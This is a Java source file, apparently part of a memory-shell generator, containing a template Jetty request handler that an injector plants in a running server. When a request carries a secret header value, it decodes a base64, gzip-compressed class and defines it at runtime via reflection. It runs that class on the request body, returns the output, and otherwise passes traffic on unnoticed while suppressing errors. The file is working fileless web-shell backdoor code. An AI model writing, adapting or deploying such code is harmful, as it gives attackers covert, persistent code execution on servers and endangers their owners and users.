package org.leo.jmg.mem.shell.http;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/** Jetty 7-11 Handler 的无 Jetty 编译依赖模板。 */
public class LeoJettyHandlerTpl {
    private static String headerName;
    private static String headerValue;
    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    /** 由 Injector 写入原 Server Handler，未命中 Header 时继续原请求链。 */
    private Object nextHandler;

    public boolean handleRequest(Object request, Object response) {
        try {
            Object header = invoke(request, "getHeader",
                    new Class[]{String.class}, new Object[]{headerName});
            if (header == null || !String.valueOf(header).contains(headerValue)) {
                return false;
            }
            invoke(response, "setStatus",
                    new Class[]{Integer.TYPE}, new Object[]{Integer.valueOf(respCode)});
            InputStream input = (InputStream) invoke(request, "getInputStream",
                    new Class[0], new Object[0]);
            OutputStream output = (OutputStream) invoke(response, "getOutputStream",
                    new Class[0], new Object[0]);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] block = new byte[1024];
            int read;
            while ((read = input.read(block)) != -1) buffer.write(block, 0, read);
            try {
                ((java.lang.reflect.InvocationHandler) loadCore().newInstance()).invoke(null, null, new Object[]{buffer});
            } catch (Throwable e) {
                throw new IllegalStateException("Core invocation failed", e);
            }
            output.write(buffer.toByteArray());
            output.flush();
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    public void markHandled(Object baseRequest) {
        try {
            invokeCompatible(baseRequest, "setHandled",
                    new Object[]{Boolean.TRUE});
        } catch (Throwable ignored) {
        }
    }

    public void forward(Object[] arguments) {
        if (nextHandler == null) return;
        try {
            invokeCompatible(nextHandler, "handle", arguments);
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("all")
    private Class loadCore() throws Exception {
        ClassLoader loader = getClass().getClassLoader();
        try {
            return Class.forName(coreClassName, true, loader);
        } catch (ClassNotFoundException ignored) {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            GZIPInputStream gzip = new GZIPInputStream(
                    new ByteArrayInputStream(base64Decode(coreClass)));
            byte[] block = new byte[4096];
            int read;
            while ((read = gzip.read(block)) != -1) output.write(block, 0, read);
            gzip.close();
            byte[] bytes = output.toByteArray();
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                    "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            return (Class) defineClass.invoke(loader, bytes,
                    Integer.valueOf(0), Integer.valueOf(bytes.length));
        }
    }

    private static Object invoke(Object target, String name,
                                 Class[] parameterTypes, Object[] arguments) throws Exception {
        Method method = target.getClass().getMethod(name, parameterTypes);
        method.setAccessible(true);
        return method.invoke(target, arguments);
    }

    private static Object invokeCompatible(Object target, String name,
                                           Object[] arguments) throws Exception {
        Class type = target.getClass();
        while (type != null) {
            Method[] methods = type.getDeclaredMethods();
            for (int i = 0; i < methods.length; i++) {
                Method method = methods[i];
                if (!method.getName().equals(name)
                        || method.getParameterTypes().length != arguments.length) continue;
                method.setAccessible(true);
                return method.invoke(target, arguments);
            }
            type = type.getSuperclass();
        }
        throw new NoSuchMethodException(name);
    }

    @SuppressWarnings("all")
    private static byte[] base64Decode(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64")
                    .getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class)
                    .invoke(decoder, value);
        }
    }
}
